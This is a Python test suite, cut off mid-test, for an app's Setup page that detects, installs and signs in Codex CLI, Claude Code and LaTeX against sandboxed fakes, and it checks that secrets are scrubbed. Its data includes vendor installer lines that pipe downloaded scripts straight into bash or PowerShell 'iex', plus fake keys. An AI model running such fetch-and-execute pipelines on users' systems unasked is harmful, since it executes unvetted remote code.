"""The Setup page's server side (ui/program_setup.py and its routes in ui/server.py).

Everything runs against the fake Codex CLI, Claude Code, LaTeX tools and installer of tests/setup_fakes.py, in
an empty HOME, CODEX_HOME and CLAUDE_CONFIG_DIR with PATH=<tmp>/bin:/usr/bin:/bin. A guard fails the test if any
process starts that is not a fake in the test's folder (or bash/sh running a line that names only files there,
this Python, or ps for Stop), and the official installer lines are replaced in every test that runs a step. No
model, network, real installer or real sign-in is ever reached.
"""

from tests import isolated_state  # noqa: F401 - first: keeps private state out of the checkout.
import http.client
import json
import os
from pathlib import Path
import shlex
import shutil
import signal
import stat
import subprocess
import sys
import tempfile
import threading
import time
import unittest
from unittest import mock

import workflow_runner as runtime
from retrieval import runtime as retrieval_runtime
from runner import claude_cli, providers
from tests import setup_fakes
from ui import program_setup, server

POSIX = os.name != "nt"
REAL_POPEN = subprocess.Popen
APIKEY_LINE = "sk-test-ABCDEFGH12345678"
ENV_SECRETS = {"OPENAI_API_KEY": "sk-openai-env-0000000000", "CODEX_API_KEY": "sk-codex-env-1111111111",
               "ANTHROPIC_API_KEY": "sk-ant-env-2222222222", "ANTHROPIC_BASE_URL": "https://gateway.invalid",
               "CLAUDE_CODE_OAUTH_REFRESH_TOKEN": "refresh-3333333333", "SSH_AUTH_SOCK": "/agent.sock",
               "CODEX_INSTALL_DAEMON_ONLY": "1"}
SECRET_VALUES = [ENV_SECRETS[name] for name in ("OPENAI_API_KEY", "CODEX_API_KEY", "ANTHROPIC_API_KEY",
                                                "CLAUDE_CODE_OAUTH_REFRESH_TOKEN")]
# What the fake installer prints that must never be kept or sent (see setup_fakes.INSTALLER).
RAW_SECRETS = ("sk-ant-api03-ABCDEFGHIJKLMNOP", "sk-proj-ZYXWVUTS98765432", "eyJhbGciOiJIUzI1NiJ9", "SECRETCODE",
               "SECRETSTATE", "hunter2", "abcdef0123456789secret", "\x1b[")


class AuthorStarted(BaseException):
    """A model entry point was reached: never in these tests."""


def refuse_model(*args, **kwargs):
    raise AuthorStarted("A Setup test reached a model entry point.")


def guarded_popen(root):
    """subprocess.Popen that starts only the fakes in ``root`` (and the shells, this Python and ps)."""

    allowed = {os.path.realpath(path) for path in ("/bin/sh", "/bin/bash", sys.executable)}
    ps = shutil.which("ps", path="/bin:/usr/bin")
    if ps:
        allowed.add(os.path.realpath(ps))
    inside = lambda path: os.path.realpath(path).startswith(str(root) + os.sep)  # noqa: E731

    class GuardedPopen(REAL_POPEN):
        started = []

        def __init__(self, args, *rest, **options):
            argv = shlex.split(args) if isinstance(args, str) else [str(item) for item in args]
            search = (options.get("env") or os.environ).get("PATH")
            first = shutil.which(argv[0], path=search) or argv[0]
            if not (inside(first) or os.path.realpath(first) in allowed):
                raise AssertionError(f"A Setup test tried to start {argv!r}")
            if os.path.basename(first) in {"bash", "sh"} and "-c" in argv:
                line = argv[argv.index("-c") + 1]
                outside = [token for token in shlex.split(line) if "/" in token and not inside(token)]
                if outside:
                    raise AssertionError(f"A Setup test tried to run a line naming {outside!r}")
            GuardedPopen.started.append(argv)
            super().__init__(args, *rest, **options)

    return GuardedPopen


class SetupCase(unittest.TestCase):
    """An empty computer with the fakes ready to place, and the guards on."""

    def setUp(self):
        temporary = tempfile.TemporaryDirectory()
        self.addCleanup(temporary.cleanup)
        self.root = Path(temporary.name).resolve()
        for name in ("home", "bin", "state", "codexhome", "claudeconfig", "tcs", "runs"):
            (self.root / name).mkdir()
        self.home, self.bin, self.state = self.root / "home", self.root / "bin", self.root / "state"
        self.codex_home = self.root / "codexhome"
        environment = {"HOME": str(self.home), "CODEX_HOME": str(self.codex_home),
                       "CLAUDE_CONFIG_DIR": str(self.root / "claudeconfig"), "PATH": f"{self.bin}:/usr/bin:/bin",
                       "FAKE_STATE": str(self.state), "FAKE_ROOT": str(self.root), "SHELL": "/bin/zsh",
                       providers.STORE_ENV: str(self.root / "tcs" / "api-models.json")}
        cleared = [name for name in os.environ if name in {"XDG_DATA_HOME", "CODEX_INSTALL_DIR", "LOCALAPPDATA",
                                                           "TCS_PROVER_UI_AUTH_HOME", *ENV_SECRETS,
                                                           "CLAUDE_CODE_OAUTH_TOKEN"}]
        patch = mock.patch.dict(os.environ, environment)
        patch.start()
        self.addCleanup(patch.stop)
        for name in cleared:
            os.environ.pop(name, None)
        self.popen = guarded_popen(self.root)
        installers = {key: f"{shlex.quote(str(self.root / 'tools' / 'fake-install'))} {key[0]}"
                      for key in program_setup.OFFICIAL_INSTALLERS}
        # The Codex desktop app's own Codex, which a Mac may have: a path in the test's folder instead.
        self.codex_app = self.root / "Applications" / "Codex.app" / "Contents" / "Resources" / "codex"
        for target, name, value in ((subprocess, "Popen", self.popen), (runtime, "TEX_TOOL_FOLDERS", ()),
                                    (program_setup, "INSTALLERS", installers),
                                    (retrieval_runtime, "CODEX_APP_BINARY", self.codex_app),
                                    (runtime, "goal_session", refuse_model), (claude_cli, "goal_session", refuse_model),
                                    (runtime, "author_conversation", refuse_model),
                                    (claude_cli, "author_conversation", refuse_model),
                                    (server.App, "_spawn_worker", refuse_model)):
            patch = mock.patch.object(target, name, value)
            patch.start()
            self.addCleanup(patch.stop)
        program_setup._GATES.clear()
        setup_fakes.install_fakes(self.root)
        # The lookups can reach no real program, before anything else happens.
        for name in ("codex", "claude", "latexmk", "pdflatex"):
            found = shutil.which(name)
            self.assertTrue(found is None or found.startswith(str(self.root)), found)
        self.assertIsNot(program_setup.INSTALLERS, program_setup.OFFICIAL_INSTALLERS)

    # Helpers -----------------------------------------------------------------------------------------------------
    def place(self, name, folder=None):
        return setup_fakes.place(self.root, name, folder or self.bin)

    def steer(self, **files):
        for name, value in files.items():
            (self.state / name.replace("_", "-")).write_text(str(value))

    def calls(self, program=None):
        path = self.state / "calls.jsonl"
        rows = [json.loads(line) for line in path.read_text().splitlines()] if path.exists() else []
        return [row for row in rows if program is None or row["program"] == program]

    def latex(self):
        self.place("latexmk")
        self.place("pdflatex")

    def official_codex(self, on_path=True):
        """The Codex CLI as OpenAI's installer leaves it: a link at ~/.local/bin/codex into its standalone folder."""

        folder = self.codex_home / "packages" / "standalone" / "current" / "bin"
        folder.mkdir(parents=True)
        binary = self.place("codex", folder)
        link = self.home / ".local" / "bin" / "codex"
        link.parent.mkdir(parents=True, exist_ok=True)
        link.symlink_to(binary)
        if on_path:
            (self.bin / "codex").symlink_to(link)
        (self.codex_home / "auth.json").write_text("{}")
        return link

    def official_claude(self, on_path=True):
        folder = self.home / ".local" / "share" / "claude" / "versions"
        folder.mkdir(parents=True)
        binary = setup_fakes.place(self.root, "claude", folder)
        binary.rename(folder / "2.1.289")
        link = self.home / ".local" / "bin" / "claude"
        link.parent.mkdir(parents=True, exist_ok=True)
        link.symlink_to(folder / "2.1.289")
        if on_path:
            (self.bin / "claude").symlink_to(link)
        return link

    def setup_tasks(self, busy=None):
        tasks = program_setup.SetupTasks(busy=busy)
        self.addCleanup(tasks.close)
        return tasks

    def wait_task(self, read, identity, states=("succeeded", "failed", "stopped"), timeout=20):
        deadline = time.monotonic() + timeout
        while time.monotonic() < deadline:
            task = read(identity)
            if task["state"] in states:
                return task
            time.sleep(0.05)
        self.fail(f"The step did not reach {states}: {task}")

    def program(self, status, program):
        return status["programs"][program]

    def ended(self, pid, timeout=4):
        """Whether process ``pid`` is gone (or a zombie) within ``timeout`` seconds."""

        deadline = time.monotonic() + timeout
        while time.monotonic() < deadline:
            try:
                os.kill(pid, 0)
            except ProcessLookupError:
                return True
            ps = shutil.which("ps", path="/bin:/usr/bin")
            state = REAL_POPEN([ps, "-o", "stat=", "-p", str(pid)], stdout=subprocess.PIPE,
                               stderr=subprocess.DEVNULL).communicate()[0].decode().strip() if ps else ""
            if not state or state.startswith("Z"):
                return True
            time.sleep(0.05)
        return False

    def kill(self, pid):
        try:
            os.kill(pid, signal.SIGKILL)
        except OSError:
            pass

    def wait_for(self, path, timeout=10):
        deadline = time.monotonic() + timeout
        while not path.exists() and time.monotonic() < deadline:
            time.sleep(0.05)
        self.assertTrue(path.exists(), path)
        return path


class HttpCase(SetupCase):
    """A real Server on 127.0.0.1 with its session token (jobs never launch: _spawn_worker refuses)."""

    def setUp(self):
        super().setUp()
        with mock.patch.object(server, "grant_windows_access"):
            self.http = server.Server((server.HOST, 0), runs=self.root / "runs")
        worker = threading.Thread(target=self.http.serve_forever, kwargs={"poll_interval": 0.01}, daemon=True)
        worker.start()

        def stop():
            self.http.shutdown()
            self.http.server_close()
            worker.join(timeout=5)
        self.addCleanup(stop)
        self.responses = []

    def call(self, path, body=None, *, token=True, host=None, origin=None):
        headers = {"Origin": origin or self.http.origin, "Host": host or f"{server.HOST}:{self.http.server_port}"}
        if token:
            headers["X-TCS-Prover-Token"] = self.http.token
        raw = None
        if body is not None:
            raw, headers["Content-Type"] = json.dumps(body).encode(), "application/json"
        connection = http.client.HTTPConnection(server.HOST, self.http.server_port, timeout=60)
        try:
            connection.request("POST" if body is not None else "GET", path, body=raw, headers=headers)
            response = connection.getresponse()
            data = response.read()
        finally:
            connection.close()
        text = data.decode("utf-8")
        self.responses.append(text)
        # No answer of any Setup route ever carries a key, a token, a pasted code or an escape code.
        for secret in (APIKEY_LINE, *RAW_SECRETS, *SECRET_VALUES):
            self.assertNotIn(secret, text)
        return response.status, json.loads(data)

    def status(self, query="refresh=1"):
        status, body = self.call(f"/setup?{query}")
        self.assertEqual(status, 200, body)
        return body

    def task(self, identity, after=0):
        status, body = self.call(f"/setup/task?id={identity}&after={after}")
        self.assertEqual(status, 200, body)
        return body["task"]

    def wait(self, identity, states=("succeeded", "failed", "stopped"), timeout=20):
        return self.wait_task(self.task, identity, states, timeout)

    def act(self, program, action, option=None, **extra):
        """POST /setup/action with the command the page shows now (the page's own read: the last check younger
        than ten minutes, else a new one)."""

        actions = self.program(self.status(""), program)["actions"]
        key = {"install": "install", "update": "update", "sign-in": "signIn", "use-folder": "useFolder"}[action]
        planned = actions[key]
        if action == "use-folder":
            command = planned["folder"]
        elif action == "sign-in":
            command = next(row["command"] for row in planned["dialog"]["options"] if row["id"] == option)
        else:
            command = planned["dialog"]["command"]
        body = {"program": program, "action": action, "command": command, **({"option": option} if option else {}),
                **extra}
        return self.call("/setup/action", body)


# 1. The official table and argv ------------------------------------------------------------------------------------

class OfficialCommandTests(SetupCase):
    def test_the_installers_and_the_commands_to_copy_are_the_vendors_own(self):
        self.assertEqual(program_setup.OFFICIAL_INSTALLERS, {
            ("codex", "posix"): "curl -fsSL https://chatgpt.com/codex/install.sh | CODEX_NON_INTERACTIVE=1 sh",
            ("codex", "windows"): "$env:CODEX_NON_INTERACTIVE=1; irm https://chatgpt.com/codex/install.ps1 | iex",
            ("claude", "posix"): "curl -fsSL https://claude.ai/install.sh | bash",
            ("claude", "windows"): "irm https://claude.ai/install.ps1 | iex"})
        updates = program_setup.UPDATE_COMMANDS
        self.assertEqual((updates[("codex", "homebrew")], updates[("codex", "npm")]),
                         ("brew upgrade --cask codex", "npm install -g @openai/codex"))
        self.assertEqual((updates[("claude", "homebrew")], updates[("claude", "homebrew-latest")],
                          updates[("claude", "winget")], updates[("claude", "npm")], updates[("claude", "installer")]),
                         ("brew upgrade claude-code", "brew upgrade claude-code@latest",
                          "winget upgrade Anthropic.ClaudeCode", "npm install -g @anthropic-ai/claude-code@latest",
                          "claude update"))
        terminal = program_setup.TERMINAL_COMMANDS
        self.assertIn(("Official installer, in a terminal", "curl -fsSL https://chatgpt.com/codex/install.sh | sh"),
                      terminal[("codex", "install", "posix")])
        self.assertIn(("Official installer, in Command Prompt",
                       "curl -fsSL https://claude.ai/install.cmd -o install.cmd && install.cmd && del install.cmd"),
                      terminal[("claude", "install", "windows")])
        self.assertIn(("WinGet", "winget install Anthropic.ClaudeCode"), terminal[("claude", "install", "windows")])
        self.assertEqual([row[1] for row in terminal[("codex", "sign-in", "any")]],
                         ["codex login", "codex login --device-auth"])
        latex = {system: [row.get("command") or row.get("link") for row in rows]
                 for system, rows in program_setup.LATEX_COMMANDS.items()}
        self.assertEqual(latex["macos"], ["https://tug.org/mactex/", "brew install --cask mactex-no-gui"])
        self.assertEqual(latex["linux"], ["sudo apt install latexmk texlive-latex-extra",
                                          "sudo dnf install latexmk texlive-scheme-medium", "https://tug.org/texlive/"])
        self.assertEqual(latex["windows"], ["https://tug.org/texlive/windows.html", "winget install MiKTeX.MiKTeX",
                                            "winget install StrawberryPerl.StrawberryPerl"])
        self.assertEqual(program_setup.SANDBOX_COMMANDS, [("Debian or Ubuntu", "sudo apt install bubblewrap socat"),
                                                          ("Fedora", "sudo dnf install bubblewrap socat")])

    def test_argv_runs_bash_with_pipefail_sh_without_it_and_powershell_on_windows(self):
        with mock.patch.object(program_setup, "INSTALLERS", program_setup.OFFICIAL_INSTALLERS), \
                mock.patch.object(program_setup, "platform_name", return_value="linux"):
            tools = {"curl": "/usr/bin/curl", "bash": "/bin/bash", "sh": "/bin/sh"}
            argv = program_setup.installer_argv("claude", tools)
            self.assertEqual(argv, ["/bin/bash", "-o", "pipefail", "-c", "curl -fsSL https://claude.ai/install.sh | bash"])
            self.assertEqual(program_setup.command_text(argv),
                             "/bin/bash -o pipefail -c 'curl -fsSL https://claude.ai/install.sh | bash'")
            no_bash = {"curl": "/usr/bin/curl", "bash": None, "sh": "/bin/sh"}
            self.assertEqual(program_setup.installer_argv("codex", no_bash),
                             ["/bin/sh", "-c", program_setup.OFFICIAL_INSTALLERS[("codex", "posix")]])
            self.assertIsNone(program_setup.installer_argv("claude", no_bash))
            self.assertEqual(program_setup.tools_problem("claude", no_bash),
                             "Claude Code's installer needs bash, which is not installed.")
            self.assertEqual(program_setup.tools_problem("codex", {"curl": None, "bash": "/bin/bash"}),
                             "This computer has no curl, which the installer command needs.")
        with mock.patch.object(program_setup, "INSTALLERS", program_setup.OFFICIAL_INSTALLERS), \
                mock.patch.object(program_setup, "platform_name", return_value="windows"):
            shell = r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
            argv = program_setup.installer_argv("codex", {"powershell": shell})
            self.assertEqual(argv, [shell, "-NoProfile", "-NonInteractive", "-ExecutionPolicy", "Bypass", "-Command",
                                    "$env:CODEX_NON_INTERACTIVE=1; irm https://chatgpt.com/codex/install.ps1 | iex"])
            self.assertEqual(program_setup.command_text(argv), subprocess.list2cmdline(argv))
            self.assertEqual(program_setup.tools_problem("codex", {"powershell": None}), "PowerShell was not found.")

    def test_creating_the_setup_state_starts_no_process(self):
        with mock.patch.object(subprocess, "Popen", side_effect=AssertionError("no process")):
            program_setup.SetupTasks()
            with mock.patch.object(server, "grant_windows_access"):
                http = server.Server((server.HOST, 0), runs=self.root / "runs")
            http.server_close()
        self.assertEqual(self.calls(), [])


# 2-4. Detection, parsing and the subcommand gates ----------------------------------------------------------------

class DetectionTests(SetupCase):
    def test_a_fresh_computer_offers_install_and_shows_the_commands(self):
        status = self.setup_tasks().status(refresh=True)
        codex = self.program(status, "codex")
        self.assertEqual((codex["state"], codex["path"], codex["signIn"]["state"]), ("missing", "", "not-checked"))
        self.assertTrue(codex["actions"]["install"]["available"], codex["actions"]["install"])
        self.assertEqual(codex["actions"]["install"]["dialog"]["command"],
                         shlex.join(["/bin/bash", "-o", "pipefail", "-c", program_setup.INSTALLERS[("codex", "posix")]]))
        self.assertFalse(codex["actions"]["update"]["shown"])
        self.assertEqual([row["command"] for row in codex["commands"] if row["group"] == "install"][0],
                         "curl -fsSL https://chatgpt.com/codex/install.sh | sh")
        latex = self.program(status, "latex")
        self.assertEqual((latex["state"], latex["problem"]), ("missing", "latexmk and pdflatex are missing"))
        self.assertEqual(self.calls(), [])  # Nothing to check.

    def test_working_programs_report_versions_paths_and_sign_in(self):
        self.place("codex")
        self.place("claude")
        self.latex()
        status = self.setup_tasks().status(refresh=True)
        codex, claude, latex = (self.program(status, name) for name in ("codex", "claude", "latex"))
        self.assertEqual((codex["state"], codex["version"], codex["path"], codex["kind"]),
                         ("works", "codex-cli 0.160.0", str(self.bin / "codex"), "script"))
        self.assertEqual(codex["signIn"], {"state": "signed-in", "text": "with ChatGPT", "method": "ChatGPT"})
        self.assertEqual((claude["state"], claude["version"]), ("works", "2.1.289 (Claude Code)"))
        self.assertEqual(claude["signIn"], {"state": "signed-in", "text": "as a@b.com · Claude Max",
                                            "method": "a@b.com · Claude Max"})
        self.assertNotIn("org-secret-id", json.dumps(status))  # Only five fields of the status are read.
        self.assertEqual((latex["state"], [tool["version"] for tool in latex["tools"]]),
                         ("works", ["latexmk 4.79", "pdfTeX 3.141592653-2.6-1.40.24 (TeX Live 2022)"]))
        # Each program's own checks, never a model call.
        self.assertEqual([row["argv"] for row in self.calls("codex")], [["--version"], ["login", "--help"],
                                                                         ["login", "status"]])
        self.assertEqual([row["argv"] for row in self.calls("claude")], [["--version"], ["auth", "--help"],
                                                                          ["auth", "status", "--json"]])
        # Both are the user's own scripts here: copy lines only, and a note for each.
        self.assertFalse(codex["actions"]["update"]["shown"])
        self.assertIn("is your own script; TCS Prover does not update it.", " ".join(codex["notes"]))
        self.assertIn("so it decides which Claude Code runs", " ".join(claude["notes"]))

    def test_the_official_installs_are_recognized_and_offer_update(self):
        self.official_codex()
        self.official_claude()
        status = self.setup_tasks().status(refresh=True)
        codex, claude = self.program(status, "codex"), self.program(status, "claude")
        self.assertEqual((codex["kind"], codex["kindText"]), ("installer", "installed by OpenAI's installer"))
        self.assertEqual((claude["kind"], claude["kindText"]), ("installer", "installed by Anthropic's installer"))
        self.assertTrue(codex["actions"]["update"]["available"])
        self.assertTrue(claude["actions"]["update"]["available"])
        self.assertEqual(claude["actions"]["update"]["dialog"]["command"], shlex.join([str(self.bin / "claude"), "update"]))
        self.assertFalse(codex["actions"]["install"]["shown"])
        self.assertEqual(codex["otherCopies"], [])  # ~/.local/bin/codex is the same file (one real path).
        self.assertIn(["--help"], [row["argv"] for row in self.calls("claude")])  # The update gate.

    def test_a_script_where_the_codex_installer_writes_is_never_replaced(self):
        script = self.place("codex", self.home / ".local" / "bin")
        (self.bin / "codex").symlink_to(script)
        codex = self.program(self.setup_tasks().status(refresh=True), "codex")
        self.assertEqual(codex["kind"], "script")
        self.assertFalse(codex["actions"]["install"]["shown"] or codex["actions"]["update"]["shown"])
        self.assertIn("~/.local/bin/codex is your own script, not the link OpenAI's installer makes there. The "
                      "installer would replace it, so TCS Prover does not run installs or updates here.",
                      " ".join(codex["notes"]))
        self.assertIn("curl -fsSL https://chatgpt.com/codex/install.sh | sh",
                      [row["command"] for row in codex["commands"] if row["group"] == "update"])
        # Broken as well: still no install over it.
        self.steer(codex_version_exit=1)
        program_setup._GATES.clear()
        codex = self.program(self.setup_tasks().status(refresh=True), "codex")
        self.assertEqual(codex["state"], "broken")
        self.assertFalse(codex["actions"]["install"]["shown"])

    def test_homebrew_and_npm_copies_get_their_own_update_commands(self):
        cask = self.root / "opt" / "Caskroom" / "codex" / "0.160.0"
        brew = self.place("codex", cask)
        (self.bin / "codex").symlink_to(brew)
        npm = self.place("claude", self.root / "lib" / "node_modules" / "@anthropic-ai" / "claude-code" / "bin")
        (self.bin / "claude").symlink_to(npm)
        status = self.setup_tasks().status(refresh=True)
        codex, claude = self.program(status, "codex"), self.program(status, "claude")
        self.assertEqual((codex["kind"], claude["kind"]), ("homebrew", "npm"))
        self.assertEqual([row["command"] for row in codex["commands"] if row["group"] == "update"],
                         ["brew upgrade --cask codex"])
        self.assertEqual([row["command"] for row in claude["commands"] if row["group"] == "update"],
                         ["npm install -g @anthropic-ai/claude-code@latest"])
        self.assertIn("This copy was installed with Homebrew. Update it the same way:", codex["notes"])
        self.assertFalse(codex["actions"]["update"]["shown"] or claude["actions"]["update"]["shown"])

    def test_other_copies_are_listed_once_each(self):
        first = self.place("codex")
        other = self.place("codex", self.root / "elsewhere")
        same = self.root / "same"
        same.mkdir()
        (same / "codex").symlink_to(other)
        os.environ["PATH"] = f"{self.bin}:{self.root / 'elsewhere'}:{same}:/usr/bin:/bin"
        codex = self.program(self.setup_tasks().status(refresh=True), "codex")
        self.assertEqual(codex["path"], str(first))
        self.assertEqual(codex["otherCopies"], [str(other)])
        self.assertIn(f"Jobs use the first one found: {first}. Also on this computer: {other}.", codex["notes"])

    @unittest.skipUnless(sys.platform == "darwin", "the Codex desktop app is a macOS place")
    def test_the_codex_desktop_apps_own_codex_is_listed_as_another_copy(self):
        self.place("codex")
        app = self.place("codex", self.codex_app.parent)  # retrieval_runtime.CODEX_APP_BINARY in this test.
        codex = self.program(self.setup_tasks().status(refresh=True), "codex")
        self.assertEqual(codex["otherCopies"], [str(app)])

    def test_a_check_that_fails_says_so_in_the_shape_of_a_result(self):
        # For example a full disk, where no check can make its private folder.
        with mock.patch.object(program_setup, "check_latex", side_effect=OSError(28, "No space left on device")):
            latex = self.program(self.setup_tasks().status(refresh=True), "latex")
        self.assertEqual((latex["state"], latex["tools"]), ("unknown", []))
        self.assertEqual(latex["problem"], "TCS Prover could not check LaTeX (OSError). Click Check again.")

    def test_a_check_that_does_not_answer_is_stopped_and_reported(self):
        self.place("codex")
        self.steer(codex_version_sleep=30)
        with mock.patch.object(program_setup, "CHECK_SECONDS", 0.5):
            started = time.monotonic()
            codex = self.program(self.setup_tasks().status(refresh=True), "codex")
        self.assertLess(time.monotonic() - started, 10)
        self.assertEqual((codex["state"], codex["problem"]),
                         ("broken", "codex --version did not answer within 0.5 seconds."))
        pid = int((self.state / "codex-version-pid").read_text())
        with self.assertRaises(ProcessLookupError):
            os.kill(pid, 0)

    def test_a_broken_program_says_why(self):
        self.place("claude")
        self.steer(claude_version="")  # Prints an empty line.
        (self.state / "claude-version").write_text("")
        claude = self.program(self.setup_tasks().status(refresh=True), "claude")
        self.assertEqual((claude["state"], claude["problem"]), ("broken", "claude --version printed nothing."))
        self.assertFalse(claude["actions"]["install"]["shown"])  # The user's own script: copy lines only.


class ParsingTests(unittest.TestCase):
    def test_codex_login_status(self):
        parse = program_setup.parse_codex_status
        self.assertEqual(parse(0, "Logged in using ChatGPT\n"), {"state": "signed-in", "text": "with ChatGPT",
                                                                 "method": "ChatGPT"})
        api = parse(0, f"Logged in using an API key - {APIKEY_LINE}\n")
        self.assertEqual(api, {"state": "signed-in", "text": "with an API key", "method": "an API key"})
        self.assertNotIn("sk-", json.dumps(api))
        token = parse(0, "Logged in using access token - eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ4eXoifQ.sig")
        self.assertEqual(token["text"], "with access token")
        self.assertEqual(parse(1, "Not logged in\n")["state"], "signed-out")
        # After the page's "Could not check": the reason alone, as plain text (no Markdown).
        self.assertEqual(parse(1, "Error checking login status: the keyring is locked"),
                         {"state": "unknown", "text": "The keyring is locked", "method": ""})
        self.assertEqual(parse(1, "Error checking login status:")["text"], "")
        self.assertEqual(parse(2, "something else"), {"state": "unknown", "method": "",
                                                      "text": "codex login status ended with code 2: something else"})

    def test_claude_auth_status(self):
        parse = program_setup.parse_claude_status
        signed = parse(0, 'warning\n{"loggedIn": true, "authMethod": "claude.ai", "email": "a@b.com", '
                          '"subscriptionType": "max", "orgId": "secret"}')
        self.assertEqual((signed["state"], signed["text"]), ("signed-in", "as a@b.com · Claude Max"))
        self.assertNotIn("secret", json.dumps(signed))
        self.assertEqual(parse(0, '{"loggedIn": true, "authMethod": "claude.ai", "email": null}')["text"],
                         "as Claude subscription")
        self.assertEqual(parse(1, '{"loggedIn": false}')["state"], "signed-out")
        token = parse(0, '{"loggedIn": true, "authMethod": "oauth_token"}')
        self.assertEqual((token["text"], token.get("token")), ("with the token in CLAUDE_CODE_OAUTH_TOKEN", True))
        self.assertEqual(parse(0, '{"loggedIn": true, "authMethod": "api_key"}')["text"],
                         "with an Anthropic Console account")
        self.assertEqual(parse(0, '{"loggedIn": true, "authMethod": "third_party", "apiProvider": "Bedrock"}')["text"],
                         "through Bedrock")
        self.assertEqual(parse(1, "not json"), {
            "state": "unknown", "method": "",
            "text": "Claude Code's sign-in status could not be read (claude auth status ended with code 1: not json)."})

    def test_a_long_detail_is_shortened_visibly(self):
        text = program_setup.parse_codex_status(1, "Error checking login status: " + "x" * 400)["text"]
        self.assertTrue(text.endswith("…"), text)
        self.assertEqual(len(text), 200)

    def test_cleaning_removes_escape_codes_controls_keys_tokens_codes_and_passwords(self):
        line = ("\x1b[1mbold\x1b[0m \x1b]8;;https://x\x07link\x1b]8;;\x07 \x07bell\x00 sk-ant-api03-ABCDEFGHIJ "
                "task-runner-12345678 eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.c2ln "
                "https://h/cb?code=C0DE&state=ST&x=1 Authorization: Bearer abc.def http://u:p@proxy:1 tab\there")
        self.assertEqual(program_setup.clean(line, {"pasted#code"}),
                         "bold link bell [removed key] task-runner-12345678 [removed token] "
                         "https://h/cb?code=[removed]&state=[removed]&x=1 Authorization: Bearer [removed] "
                         "http://[removed]@proxy:1 tab\there")
        self.assertEqual(program_setup.clean("you pasted pasted#code", {"pasted#code"}), "you pasted [removed]")


class GateTests(SetupCase):
    def test_no_status_command_runs_without_its_help_listing_it(self):
        self.place("codex")
        self.place("claude")
        self.steer(codex_no_status=1, claude_no_status=1)
        status = self.setup_tasks().status(refresh=True)
        self.assertEqual(self.program(status, "codex")["signIn"],
                         {"state": "unknown", "text": "This Codex CLI cannot report its sign-in.", "method": ""})
        self.assertEqual(self.program(status, "claude")["signIn"]["text"], "This Claude Code cannot report its sign-in.")
        self.assertEqual([row["argv"] for row in self.calls("codex")], [["--version"], ["login", "--help"]])
        self.assertEqual([row["argv"] for row in self.calls("claude")], [["--version"], ["auth", "--help"]])
        # Without its status command Claude Code is not signed in from here either (auth login is not called).
        self.assertFalse(self.program(status, "claude")["actions"]["signIn"]["shown"])

    def test_claude_code_is_not_signed_in_before_its_help_lists_the_command(self):
        # A Claude Code whose `auth --help` does not answer in time (S6: no `auth login` before it lists it).
        fake = self.root / "fakes" / "claude"
        wrapper = self.bin / "claude"
        wrapper.write_text(f"#!{sys.executable} -I\nimport os, sys, time\n"
                           "if sys.argv[1:] == ['auth', '--help']:\n    time.sleep(30)\n"
                           f"os.execv({str(fake)!r}, [{str(fake)!r}, *sys.argv[1:]])\n")
        wrapper.chmod(0o755)
        self.steer(claude_login="none")
        tasks = self.setup_tasks()
        with mock.patch.object(program_setup, "CHECK_SECONDS", 2):
            claude = self.program(tasks.status(refresh=True), "claude")
        self.assertEqual(claude["signIn"]["text"], "The sign-in check did not answer within 2 seconds.")
        sign_in = claude["actions"]["signIn"]
        self.assertEqual((sign_in["shown"], sign_in["available"], sign_in["reason"]),
                         (True, False, "TCS Prover could not check Claude Code's sign-in command. Click Check again."))
        command = next(row["command"] for row in sign_in["dialog"]["options"] if row["id"] == "subscription")
        with self.assertRaises(program_setup.SetupRefused) as refused:
            tasks.start({"program": "claude", "action": "sign-in", "option": "subscription", "command": command})
        self.assertEqual((refused.exception.status, str(refused.exception)), (409, program_setup.SIGN_IN_GATE_TEXT))
        self.assertEqual([row["argv"] for row in self.calls("claude")], [["--version"]])

    def test_no_update_runs_without_the_update_command(self):
        self.official_claude()
        self.steer(claude_no_update=1)
        claude = self.program(self.setup_tasks().status(refresh=True), "claude")
        self.assertEqual((claude["actions"]["update"]["available"], claude["actions"]["update"]["reason"]),
                         (False, "This Claude Code has no update command."))
        self.assertNotIn(["update"], [row["argv"] for row in self.calls("claude")])

    def test_the_gate_answer_is_kept_per_binary(self):
        self.place("codex")
        tasks = self.setup_tasks()
        tasks.status(refresh=True)
        tasks.status(refresh=True)
        self.assertEqual([row["argv"] for row in self.calls("codex")].count(["login", "--help"]), 1)


# 5. Environments ------------------------------------------------------------------------------------------------

class EnvironmentTests(HttpCase):
    def test_no_check_or_step_sees_keys_agents_or_installer_settings(self):
        os.environ.update(ENV_SECRETS, CLAUDE_CODE_OAUTH_TOKEN="oauth-token-4444444444")
        self.place("codex")
        self.place("claude")
        self.latex()
        status = self.status()
        # A token in the environment is what jobs use: no sign-in from here, and the note says why.
        claude = self.program(status, "claude")
        self.assertFalse(claude["actions"]["signIn"]["shown"])
        self.assertIn("Jobs use the sign-in token in CLAUDE_CODE_OAUTH_TOKEN", " ".join(claude["notes"]))
        # Installing a missing Claude Code is offered either way, and its installer never gets the token.
        (self.bin / "claude").unlink()
        self.status()
        code, answer = self.act("claude", "install")
        self.assertEqual(code, 200, answer)
        self.wait(answer["task"]["id"])
        os.environ.pop("CLAUDE_CODE_OAUTH_TOKEN")
        # Both sign-ins and a Codex install, with every key, setting and agent socket still in the server's
        # environment.
        self.steer(codex_login="none", claude_login="none")
        self.status()
        for program, option in (("codex", "browser"), ("claude", "subscription")):
            code, answer = self.act(program, "sign-in", option)
            self.assertEqual(code, 200, answer)
            waiting = self.wait(answer["task"]["id"], states=("waiting",))
            self.call("/setup/stop", {"id": waiting["id"]})
            self.wait(waiting["id"])
        (self.bin / "codex").unlink()
        self.status()
        code, answer = self.act("codex", "install")
        self.assertEqual(code, 200, answer)
        self.wait(answer["task"]["id"])
        rows = self.calls()
        self.assertEqual(sorted(row["argv"][0] for row in self.calls("installer")), ["claude", "codex"])
        self.assertIn(["app-server"], [row["argv"] for row in rows])
        self.assertIn(["auth", "login"], [row["argv"] for row in rows])
        for row in rows:
            with self.subTest(program=row["program"], argv=row["argv"]):
                self.assertFalse(set(row["env"]) & set(ENV_SECRETS), row)
        claude_checks = [row for row in self.calls("claude") if row["argv"] == ["auth", "status", "--json"]]
        self.assertIn("CLAUDE_CONFIG_DIR", claude_checks[0]["env"])
        self.assertIn("CLAUDE_CODE_OAUTH_TOKEN", claude_checks[0]["env"])  # Jobs' own sign-in, while it was set.
        for installer in self.calls("installer"):
            with self.subTest(installer=installer["argv"]):
